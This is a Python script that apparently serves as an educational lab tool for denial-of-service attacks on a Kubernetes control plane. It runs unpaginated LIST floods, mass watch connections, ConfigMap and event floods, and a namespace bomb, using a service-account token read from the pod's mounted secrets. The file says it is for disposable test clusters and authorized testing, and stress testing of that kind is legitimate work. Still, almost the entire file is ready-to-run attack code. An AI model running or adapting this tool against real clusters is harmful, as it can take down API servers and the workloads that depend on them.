#!/usr/bin/env python3
"""
=============================================================================
API Server Flood Script - Kubernetes Control Plane Stress Test
=============================================================================

PURPOSE: Demonstrates how a compromised application with API server access
can launch a denial-of-service attack against the Kubernetes control plane.

TECHNIQUES:
  1. Concurrent LIST operations without pagination
  2. Large watch connection pools
  3. Rapid object creation/deletion (etcd churn)
  4. Namespace bomb (create many namespaces)
  5. Event flood (fill etcd with events)

USAGE:
  # Run all attacks (moderate intensity)
  python3 api-flood.py --all

  # Run specific attack
  python3 api-flood.py --attack list-flood --concurrency 50

  # Run from inside a pod (uses in-cluster auth)
  python3 api-flood.py --in-cluster --attack watch-bomb

PREREQUISITES:
  pip3 install kubernetes requests urllib3

WARNING: This script WILL degrade or crash the API server.
Run ONLY on disposable test clusters.

=============================================================================
"""

import argparse
import base64
import json
import os
import signal
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ---------------------------------------------------------------------------
# Try to import kubernetes client; provide helpful error if missing
# ---------------------------------------------------------------------------
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("ERROR: 'requests' package not found. Install with: pip3 install requests")
    sys.exit(1)

try:
    from kubernetes import client, config
    HAS_K8S_CLIENT = True
except ImportError:
    HAS_K8S_CLIENT = False
    print("WARNING: 'kubernetes' package not found. Using raw HTTP requests.")
    print("  Install with: pip3 install kubernetes")


# =============================================================================
# Configuration
# =============================================================================

class Config:
    """Attack configuration parameters."""

    def __init__(self):
        self.api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "localhost")
        self.api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "6443")
        self.insecure_port = "8080"  # Insecure port from our Kind config

        # Try insecure port first, then secure
        self.base_url = f"https://{self.api_server}:{self.api_port}"
        self.insecure_url = f"http://localhost:{self.insecure_port}"

        # Authentication
        self.token = self._get_token()
        self.headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
            "Accept": "application/json",
        }

        # Attack parameters
        self.namespace = "insecure-ns"
        self.concurrency = 20
        self.duration = 30  # seconds
        self.verify_ssl = False

    def _get_token(self):
        """Get service account token or kubeconfig token."""
        # Try in-cluster SA token
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(token_path):
            with open(token_path, "r") as f:
                return f.read().strip()

        # Try kubectl config
        try:
            import subprocess
            result = subprocess.run(
                ["kubectl", "config", "view", "--minify", "-o",
                 "jsonpath={.users[0].user.token}"],
                capture_output=True, text=True, timeout=5
            )
            if result.stdout.strip():
                return result.stdout.strip()
        except Exception:
            pass

        return ""

    def get_url(self):
        """Return the best available API server URL."""
        # Try insecure port first
        try:
            resp = requests.get(
                f"{self.insecure_url}/api/v1/namespaces",
                timeout=3
            )
            if resp.status_code == 200:
                print(f"[*] Using insecure API server: {self.insecure_url}")
                return self.insecure_url
        except Exception:
            pass

        print(f"[*] Using secure API server: {self.base_url}")
        return self.base_url


# =============================================================================
# Attack Statistics
# =============================================================================

class Stats:
    """Thread-safe attack statistics tracker."""

    def __init__(self):
        self.lock = threading.Lock()
        self.requests_sent = 0
        self.requests_success = 0
        self.requests_failed = 0
        self.bytes_received = 0
        self.start_time = time.time()

    def record(self, success: bool, bytes_count: int = 0):
        with self.lock:
            self.requests_sent += 1
            if success:
                self.requests_success += 1
            else:
                self.requests_failed += 1
            self.bytes_received += bytes_count

    def report(self):
        elapsed = time.time() - self.start_time
        rps = self.requests_sent / max(elapsed, 0.001)
        print(f"\n{'='*60}")
        print(f" Attack Statistics")
        print(f"{'='*60}")
        print(f"  Duration:         {elapsed:.1f}s")
        print(f"  Requests sent:    {self.requests_sent}")
        print(f"  Successful:       {self.requests_success}")
        print(f"  Failed:           {self.requests_failed}")
        print(f"  Requests/sec:     {rps:.1f}")
        print(f"  Data received:    {self.bytes_received / 1024:.1f} KB")
        print(f"  Failure rate:     {self.requests_failed / max(self.requests_sent, 1) * 100:.1f}%")
        print(f"{'='*60}\n")


# =============================================================================
# Attack Functions
# =============================================================================

def attack_list_flood(cfg: Config, stats: Stats):
    """
    ATTACK: Expensive LIST requests without pagination.

    The API server must load ALL objects into memory for unpaginated LIST calls.
    This is O(n) in memory where n is the total size of all objects.
    Concurrent LISTs multiply the memory impact.
    """
    print("\n[ATTACK] LIST Flood - Expensive unpaginated LIST requests")
    print(f"  Concurrency: {cfg.concurrency}")
    print(f"  Duration: {cfg.duration}s")
    print()

    url = cfg.get_url()
    resources = [
        "/api/v1/pods",
        "/api/v1/configmaps",
        "/api/v1/secrets",
        "/api/v1/events",
        "/api/v1/endpoints",
        "/api/v1/services",
        "/api/v1/namespaces",
        "/api/v1/nodes",
        "/apis/apps/v1/deployments",
        "/apis/apps/v1/replicasets",
    ]

    stop_event = threading.Event()

    def list_worker(resource):
        """Worker that continuously LISTs a resource type."""
        session = requests.Session()
        session.verify = False
        session.headers.update(cfg.headers)

        while not stop_event.is_set():
            try:
                resp = session.get(
                    f"{url}{resource}",
                    timeout=30,
                )
                stats.record(
                    success=(resp.status_code == 200),
                    bytes_count=len(resp.content)
                )
            except requests.exceptions.RequestException:
                stats.record(success=False)

    # Launch workers
    threads = []
    for i in range(cfg.concurrency):
        resource = resources[i % len(resources)]
        t = threading.Thread(target=list_worker, args=(resource,), daemon=True)
        t.start()
        threads.append(t)

    print(f"  Launched {cfg.concurrency} LIST workers. Running for {cfg.duration}s...")

    # Run for specified duration
    time.sleep(cfg.duration)
    stop_event.set()

    # Wait for threads to finish
    for t in threads:
        t.join(timeout=5)

    print("  LIST flood complete.")


def attack_watch_bomb(cfg: Config, stats: Stats):
    """
    ATTACK: Open many concurrent watch connections.

    Each watch connection consumes API server memory for:
    - The HTTP/2 stream
    - The watch cache entry
    - Event serialization buffers

    1000 watches ~= 100MB of API server memory.
    """
    print("\n[ATTACK] Watch Bomb - Exhaust API server with watch connections")
    print(f"  Watch connections: {cfg.concurrency * 5}")
    print(f"  Duration: {cfg.duration}s")
    print()

    url = cfg.get_url()
    resources = [
        "/api/v1/pods?watch=true",
        "/api/v1/configmaps?watch=true",
        "/api/v1/secrets?watch=true",
        "/api/v1/events?watch=true",
        "/api/v1/services?watch=true",
    ]

    stop_event = threading.Event()
    watch_count = threading.atomic = 0  # Python doesn't have atomic, using lock
    count_lock = threading.Lock()

    def watch_worker(resource):
        """Worker that opens a persistent watch connection."""
        session = requests.Session()
        session.verify = False
        session.headers.update(cfg.headers)

        try:
            resp = session.get(
                f"{url}{resource}&timeoutSeconds={cfg.duration}",
                stream=True,  # Keep connection open
                timeout=cfg.duration + 5,
            )
            stats.record(success=(resp.status_code == 200))

            # Read the stream slowly to keep the connection alive
            for line in resp.iter_lines():
                if stop_event.is_set():
                    break
                stats.record(success=True, bytes_count=len(line) if line else 0)
        except requests.exceptions.RequestException:
            stats.record(success=False)

    # Launch watch workers
    watch_threads = []
    total_watches = cfg.concurrency * 5
    for i in range(total_watches):
        resource = resources[i % len(resources)]
        t = threading.Thread(target=watch_worker, args=(resource,), daemon=True)
        t.start()
        watch_threads.append(t)
        if (i + 1) % 20 == 0:
            print(f"  Opened {i + 1}/{total_watches} watch connections...")

    print(f"  All {total_watches} watches opened. Holding for {cfg.duration}s...")

    time.sleep(cfg.duration)
    stop_event.set()

    for t in watch_threads:
        t.join(timeout=5)

    print("  Watch bomb complete.")


def attack_object_flood(cfg: Config, stats: Stats):
    """
    ATTACK: Rapid creation of many objects.

    Each object creation requires:
    - API server admission control processing
    - etcd write (consensus across all etcd members)
    - Watch notification to all watchers
    - Index updates

    Rapid creation floods all of these subsystems simultaneously.
    """
    print("\n[ATTACK] Object Flood - Rapid ConfigMap creation")
    print(f"  Concurrency: {cfg.concurrency}")
    print(f"  Duration: {cfg.duration}s")
    print()

    url = cfg.get_url()
    stop_event = threading.Event()
    counter_lock = threading.Lock()
    counter = [0]

    def create_worker():
        """Worker that rapidly creates and deletes ConfigMaps."""
        session = requests.Session()
        session.verify = False
        session.headers.update(cfg.headers)

        while not stop_event.is_set():
            with counter_lock:
                counter[0] += 1
                idx = counter[0]

            name = f"flood-{threading.current_thread().name}-{idx}"

            # Create
            try:
                body = {
                    "apiVersion": "v1",
                    "kind": "ConfigMap",
                    "metadata": {
                        "name": name,
                        "namespace": cfg.namespace,
                    },
                    "data": {
                        "key": f"value-{idx}",
                        "timestamp": str(time.time()),
                    },
                }
                resp = session.post(
                    f"{url}/api/v1/namespaces/{cfg.namespace}/configmaps",
                    json=body,
                    timeout=10,
                )
                stats.record(success=(resp.status_code in [200, 201]))
            except requests.exceptions.RequestException:
                stats.record(success=False)

            # Delete (cleanup)
            try:
                session.delete(
                    f"{url}/api/v1/namespaces/{cfg.namespace}/configmaps/{name}",
                    timeout=10,
                )
            except requests.exceptions.RequestException:
                pass

    threads = []
    for i in range(cfg.concurrency):
        t = threading.Thread(target=create_worker, daemon=True, name=f"w{i}")
        t.start()
        threads.append(t)

    print(f"  Launched {cfg.concurrency} create/delete workers for {cfg.duration}s...")
    time.sleep(cfg.duration)
    stop_event.set()

    for t in threads:
        t.join(timeout=5)

    print("  Object flood complete.")


def attack_namespace_bomb(cfg: Config, stats: Stats):
    """
    ATTACK: Create many namespaces rapidly.

    Namespace creation is especially expensive because:
    - It triggers the NamespaceLifecycle admission controller
    - Creates default ServiceAccount
    - Creates default Secrets
    - Triggers ResourceQuota calculations
    - Updates the namespace informer cache for all controllers
    """
    print("\n[ATTACK] Namespace Bomb - Rapid namespace creation")
    print(f"  Target namespaces: {cfg.concurrency * 10}")
    print()

    url = cfg.get_url()
    session = requests.Session()
    session.verify = False
    session.headers.update(cfg.headers)

    created_namespaces = []
    ns_count = min(cfg.concurrency * 10, 200)  # Cap at 200 for safety

    def create_namespace(idx):
        name = f"bomb-ns-{idx}"
        try:
            body = {
                "apiVersion": "v1",
                "kind": "Namespace",
                "metadata": {"name": name},
            }
            resp = session.post(
                f"{url}/api/v1/namespaces",
                json=body,
                timeout=10,
            )
            success = resp.status_code in [200, 201]
            stats.record(success=success)
            if success:
                created_namespaces.append(name)
            return success
        except requests.exceptions.RequestException:
            stats.record(success=False)
            return False

    # Create namespaces concurrently
    with ThreadPoolExecutor(max_workers=cfg.concurrency) as executor:
        futures = {executor.submit(create_namespace, i): i for i in range(ns_count)}
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 25 == 0:
                print(f"  Created {completed}/{ns_count} namespaces...")

    print(f"  Created {len(created_namespaces)} namespaces.")
    print()

    # Measure API server response time
    print("  Measuring API server response time...")
    start = time.time()
    try:
        resp = session.get(f"{url}/api/v1/nodes", timeout=30)
        elapsed = time.time() - start
        print(f"  API response time: {elapsed:.3f}s (status: {resp.status_code})")
    except Exception as e:
        elapsed = time.time() - start
        print(f"  API request failed after {elapsed:.3f}s: {e}")

    # Cleanup
    print("\n  Cleaning up namespaces...")

    def delete_namespace(name):
        try:
            session.delete(f"{url}/api/v1/namespaces/{name}", timeout=10)
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=cfg.concurrency) as executor:
        executor.map(delete_namespace, created_namespaces)

    print("  Namespace bomb cleanup complete.")


def attack_event_flood(cfg: Config, stats: Stats):
    """
    ATTACK: Flood the cluster with events.

    Events are the most numerous objects in most Kubernetes clusters.
    Creating many events rapidly pressures etcd and the API server's
    event processing pipeline.
    """
    print("\n[ATTACK] Event Flood - Fill cluster with synthetic events")
    print(f"  Concurrency: {cfg.concurrency}")
    print(f"  Duration: {cfg.duration}s")
    print()

    url = cfg.get_url()
    stop_event = threading.Event()
    counter_lock = threading.Lock()
    counter = [0]

    def event_worker():
        """Worker that creates events rapidly."""
        session = requests.Session()
        session.verify = False
        session.headers.update(cfg.headers)

        while not stop_event.is_set():
            with counter_lock:
                counter[0] += 1
                idx = counter[0]

            try:
                event = {
                    "apiVersion": "v1",
                    "kind": "Event",
                    "metadata": {
                        "name": f"flood-event-{idx}",
                        "namespace": cfg.namespace,
                    },
                    "involvedObject": {
                        "apiVersion": "v1",
                        "kind": "Pod",
                        "name": "nonexistent-pod",
                        "namespace": cfg.namespace,
                    },
                    "reason": "FloodTest",
                    "message": f"Flood event {idx} at {time.time()}",
                    "type": "Warning",
                    "firstTimestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "lastTimestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
                }
                resp = session.post(
                    f"{url}/api/v1/namespaces/{cfg.namespace}/events",
                    json=event,
                    timeout=10,
                )
                stats.record(success=(resp.status_code in [200, 201]))
            except requests.exceptions.RequestException:
                stats.record(success=False)

    threads = []
    for i in range(cfg.concurrency):
        t = threading.Thread(target=event_worker, daemon=True)
        t.start()
        threads.append(t)

    print(f"  Launched {cfg.concurrency} event workers for {cfg.duration}s...")
    time.sleep(cfg.duration)
    stop_event.set()

    for t in threads:
        t.join(timeout=5)

    print(f"  Event flood complete. Created ~{counter[0]} events.")


# =============================================================================
# Measure API Server Health
# =============================================================================

def measure_api_health(cfg: Config):
    """Measure API server responsiveness before/after attacks."""
    url = cfg.get_url()
    session = requests.Session()
    session.verify = False
    session.headers.update(cfg.headers)

    print("\n[HEALTH CHECK] Measuring API server responsiveness...")

    endpoints = [
        ("/healthz", "Health endpoint"),
        ("/api/v1/nodes", "List nodes"),
        ("/api/v1/namespaces", "List namespaces"),
    ]

    for path, desc in endpoints:
        try:
            start = time.time()
            resp = session.get(f"{url}{path}", timeout=30)
            elapsed = time.time() - start
            status = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
            print(f"  {desc:25s} : {status} ({elapsed:.3f}s)")
        except requests.exceptions.RequestException as e:
            elapsed = time.time() - start
            print(f"  {desc:25s} : FAILED ({elapsed:.3f}s) - {e}")

    print()


# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Kubernetes API Server Flood Tool (Educational)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ATTACKS:
  list-flood      Expensive LIST requests without pagination
  watch-bomb      Open many concurrent watch connections
  object-flood    Rapid object creation/deletion
  namespace-bomb  Create many namespaces
  event-flood     Fill cluster with events

EXAMPLES:
  %(prog)s --all                          Run all attacks
  %(prog)s --attack list-flood            Run specific attack
  %(prog)s --attack watch-bomb -c 100     Run with higher concurrency
  %(prog)s --attack object-flood -d 60    Run for 60 seconds

WARNING: For AUTHORIZED SECURITY TESTING ONLY.
        """
    )

    parser.add_argument("--attack", "-a", type=str,
                        choices=["list-flood", "watch-bomb", "object-flood",
                                 "namespace-bomb", "event-flood"],
                        help="Specific attack to run")
    parser.add_argument("--all", action="store_true",
                        help="Run all attacks in sequence")
    parser.add_argument("--concurrency", "-c", type=int, default=20,
                        help="Number of concurrent workers (default: 20)")
    parser.add_argument("--duration", "-d", type=int, default=30,
                        help="Attack duration in seconds (default: 30)")
    parser.add_argument("--in-cluster", action="store_true",
                        help="Use in-cluster authentication")
    parser.add_argument("--api-server", type=str,
                        help="API server URL override")

    args = parser.parse_args()

    if not args.attack and not args.all:
        parser.print_help()
        print("\nERROR: Specify --attack or --all")
        sys.exit(1)

    # Initialize configuration
    cfg = Config()
    cfg.concurrency = args.concurrency
    cfg.duration = args.duration

    if args.api_server:
        cfg.base_url = args.api_server

    # Initialize statistics
    stats = Stats()

    # Banner
    print("=" * 60)
    print(" Kubernetes API Server Flood Tool")
    print(" FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 60)
    print(f" API Server:  {cfg.get_url()}")
    print(f" Concurrency: {cfg.concurrency}")
    print(f" Duration:    {cfg.duration}s")
    print(f" Token:       {'present' if cfg.token else 'none (using anonymous)'}")
    print("=" * 60)

    # Health check before
    measure_api_health(cfg)

    # Run attacks
    attacks = {
        "list-flood": attack_list_flood,
        "watch-bomb": attack_watch_bomb,
        "object-flood": attack_object_flood,
        "namespace-bomb": attack_namespace_bomb,
        "event-flood": attack_event_flood,
    }

    if args.all:
        for name, func in attacks.items():
            print(f"\n{'='*60}")
            print(f" Running: {name}")
            print(f"{'='*60}")
            func(cfg, stats)
            print("\n  Cooling down for 5s...")
            time.sleep(5)
    else:
        attacks[args.attack](cfg, stats)

    # Health check after
    measure_api_health(cfg)

    # Print statistics
    stats.report()


if __name__ == "__main__":
    main()
